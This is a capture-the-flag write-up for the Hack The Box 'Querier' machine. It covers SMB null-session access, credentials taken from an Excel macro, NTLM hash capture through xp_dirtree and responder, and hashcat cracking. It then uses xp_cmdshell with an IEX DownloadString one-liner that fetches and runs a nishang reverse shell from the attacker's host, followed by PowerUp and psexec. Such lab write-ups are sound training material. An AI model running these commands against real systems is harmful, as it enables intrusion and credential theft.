# Querier [htb](https://app.hackthebox.com/machines/Querier)
![querier-01]()


## Recon 

Lets start by adding the target to our `/etc/hosts` file:

![hosts-02]()

With that out of the way, we can enumerating:

`nmap -sC -sV -p- -A querier.htb -oN nmap.result`

![nmap-res-03]()

We have the following:

+ RPC endpoint mapper on port 135.
+ netBIOS on port 139.
+ SMB on port 445.
+ Microsoft SQL server on port 1433.
+ HTTP-API on ports 5985 & 47001.
+ Other RPC related ports. 


The services that jump out the most to me are the SQL and SMB servers. Lets start bt taking a look at the SMB though, maybe its misconfigured and we can access information we shouldnt. After that we'll take a look at the SQL server. 


## SMB port 445

Lets try to list out the SMB shares with a null session:

`smbclient -N -L \\\\querier.htb\\`

![shares-04]()

A null session is accepted, ideally this should not happen. Lets try to connect to the `Reports` share:

![smb-connect-05]()

We can see the share hosts a single `.xlsm` file, this is a microsoft Excel file. 
I use the following code to open the file on Linux:

```python
#!/usr/bin/python3

import sys
import pandas as pd

if len(sys.argv) != 2:
    print(f'Usage {sys.argv[0]} <input_xlsm_file>')
    sys.exit()

df = pd.read_excel(sys.argv[1], sheet_name=None)

for k,v in df.items():
    print(f'{k} = {v}')
```

However the file is empty: 

![empty-06]()

If we open the file through a Windows machine and click on `File`:

![button-07]()


We can see the following:

![luis-08]()

At first i thought `Luis` is a username, and tried brute-forcing my way into the SQL server. This failed. 
So i decided to inspect the file by clicking the highlighted button which resulted in:

![inspect-09]()

It says that the file has Maros configured. A macro is an action or a set of actions that can be recorded, named, saved and executed as many times as required and whenever desired. In other words its code. 

We can extract the macro code in clear text with a tool called [olevba](https://github.com/decalage2/oletools/wiki/olevba). You can download it with:

`sudo -H pip install -U oletools`

Once we have it installed we can extract the Macro code with:

`olevba 'Currency Volume Report.xlsm'`

![olevba-10]()


This is an [SQL connection string](https://learn.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlconnection.connectionstring?view=dotnet-plat-ext-7.0), the `Uid` is a username, and the `Pwd` is the password. 

Lets try to login to the SQL server with:

`impacket-mssqlclient reporting@querier.htb -windows-auth`

![sql-login-11]()

Were in! I tried enumerataing the database, as well as trying to pull off RCE, nothing worked for me. [source](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server).

Our user has very little permissions on the server, and there isn't much to see on the database. 
I also tried using the credentials we found with `impacket` tools like `psexec`, `wmiexec`, etc. Nothing worked for me. 

So i decided to try a MITM attack to capture the `mssql-svc` service account NTLM hash. 
To do this we need to run `responder` on our kali machine:

`responder -I tun0 -dwv`

Then, in the SQL prompt, we need to tell the server to fetch a file from our kali via SMB. There is no file or SMB server on 
our kali, but in the process, the SQL server service itself well send over its NTLM
hash which we will capture with `responder`. (These sorts of attacks are more common in AD environments).

Once `responder` is running, on the SQL server execute the following:

`xp_dirtree '\\<attacker_IP>\any\thing'`


Now check responder: 

![responder-12]()

Lets crack it. 


First save it to a file:

![hash-13]()


Now we can use `hashcat` to crack NTLMv2 hashes as such:

`hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o mssql-svc.pass`


The hash gets cracked rather quickly:

![cracked-14]()

Lets log back in to the SQL server with the new account, now we should be able to pull of an RCE. 

The first we need is a reverse shell script, i will [nishang's](https://github.com/samratashok/nishang) `Invoke-PowerShellTcp.ps1`.

Copy this script over to your working directory, open it, and add the following at the end:

`Invoke-PowerShellTcp -Reverse -IPAddress <kali-ip> -Port 9001`


Next, over at the SQL server we need to enable advanced options:

`sp_configure 'show advanced options', '1'`
`RECONFIGURE`


Now we can enable command execution with:

`sp_configure 'xp_cmdshell', '1'`
`RECONFIGURE`

On your kali start a python server:

`python3 -m http.server 80`

Start the listner: 

`nc -lnvp 9001`


Now we are ready to execute, on the SQL server run:

`EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://<kali-ip>/shell.ps1") | powershell -noprofile'`


Get a shell:

![shell-15]()


## Privilege Escalation


Lets cd into a directory we can work with:

`cd C:\Users\mssql-svc\appdata\local\temp`

From here, we can download and run [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). 
Once you have the script on you kali start a python server:

`python3 -m http.server 80`

From the target, download the script with:

`iwr http://kali-ip/PowerUp.ps1 -OutFile powerup.ps1`

Start a Powershell session and load the script with:

```cmd
powershell -ep bypass
. .\powerup.ps1
Invoke-AllChecks
```

![admin-pass-16]()

There are a lot of leads we can take from the PowerUp output, but i think this is the easiest. 

All we need to do is use `psexec`:

`impacket-psexec QUERIER/Administrator:'MyUnclesAreMarioAndLuigi!!1!'@querier.htb`

![root-17]()
